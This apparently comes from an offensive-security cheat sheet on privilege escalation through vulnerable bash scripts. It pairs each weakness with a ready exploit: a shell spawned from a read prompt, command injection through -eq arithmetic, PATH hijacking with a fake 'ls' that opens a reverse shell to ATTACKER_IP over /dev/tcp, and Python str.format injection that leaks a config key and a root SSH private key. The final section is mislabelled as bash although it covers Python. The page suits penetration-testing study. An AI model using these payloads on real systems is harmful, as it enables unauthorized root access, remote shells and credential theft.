# Bash

## Theory

Bash scripting is a powerful tool used by system administrators and developers to automate tasks and streamline processes on Unix-like systems. However, like any software, bash scripts can be vulnerable to various security issues, which, if exploited, can lead to privilege escalation and unauthorized access.

## Practice

### Shell In Prompt

{% tabs %}
{% tab title="Enumerate" %}
If a bash script executes `read -p`. We can input `/bin/bash -i` to get a shell as another user.

```bash
$ cat /usr/bin/vuln-script.sh

#!/bin/bash
read -p "What's you name: "
```
{% endtab %}

{% tab title="Exploit" %}
We can input `/bin/bash -i` to get a shell.

```bash
$ sudo /usr/bin/sudo-script.sh

What's you name: /bin/bash -i
```
{% endtab %}
{% endtabs %}

### Bash eq

{% tabs %}
{% tab title="Enumerate" %}
If a bash script use the `-eq` comaparison, it's vulnerable to arbitrary command execution.

```bash
$ cat /usr/bin/vuln-script.sh

#!/bin/bash
read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```
{% endtab %}

{% tab title="Exploit" %}
To execute arbitrary command, answer this question as below. We have to Inject arbitrary command before the correct number (42).

```bash
sudo /bin/bash /opt/example.sh
Enter guess: a[$(/bin/bash -p >&2)]+42

#Or execute your own malicious script
sudo /bin/bash /opt/example.sh
Enter guess: a[$(/tmp/shell.elf)]+42
```

{% hint style="info" %}
`a[$(/tmp/shell.elf)]` will allow us, by evaluating the content of the array, to execute our script
{% endhint %}
{% endtab %}
{% endtabs %}

### No Command Path Exploit

{% tabs %}
{% tab title="Enumerate" %}
If a bash script executes another command **without specifying the path.** We can abuse it and get a privilege escalation.

```bash
$ cat /usr/bin/vuln-suid-script.sh

#!/bin/bash
ls /root/var/file
```
{% endtab %}

{% tab title="Exploit" %}
We can generate a malicious file in the `/tmp` folder named as the command called without full path

```bash
#Generate a payload
echo "bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" > /tmp/ls
chmod +x /tmp/ls

#Change Path env variable and execute the script
export PATH=/tmp:$PATH
/usr/bin/vuln-suid-script.sh
```
{% endtab %}
{% endtabs %}

### Unquoted Expression Injection

{% tabs %}
{% tab title="Enumerate" %}
The `str.format()` string method was introduced in Python 3 was later also added to Python 2.7. It allows multiple substitutions and value formatting. Vulnerability comes when our Python app uses `str.format()` in the **user-controlled string**. This vulnerability may lead attackers to get **access to sensitive information**.

Here is an example of a vulnerable code:
```python
# Let us assume this CONFIG & SECRET holds some sensitive information
CONFIG = {
	"KEY": "ASXFYFGK78989"
}
SECRET = [line.strip() for line in open("/root/.ssh/id_rsa")]

class PeopleInfo:
	def __init__(self, fname, lname):
		self.fname = fname
		self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
	return avatar_str.format(people_obj = people_obj)


# Driver Code
people = PeopleInfo('GEEKS', 'FORGEEKS')

# case 1: st obtained from user
st = input()
res = get_name_for_avatar(st, people_obj = people)
print(res)
```
{% endtab %}

{% tab title="Exploit" %}
To extract sensitive informations we can give the following strings as input:
```python
#We can extract the Config key with the following input
{people_obj.__init__.__globals__[CONFIG][KEY]}
#Output
ASXFYFGK78989

#We can extract the SSH key with the following input
SECRET_{people_obj.__init__.__globals__[SECRET]}_SECRET
#Output
SECRET_['-----BEGIN OPENSSH PRIVATE KEY-----', 'b3BlbnNzaC1rZXk'[...]]_SECRET

#Or we can try with the "self" variable (won't work here)
{self.__init__.__globals__[CONFIG][KEY]}
```
{% endtab %}
{% endtabs %}
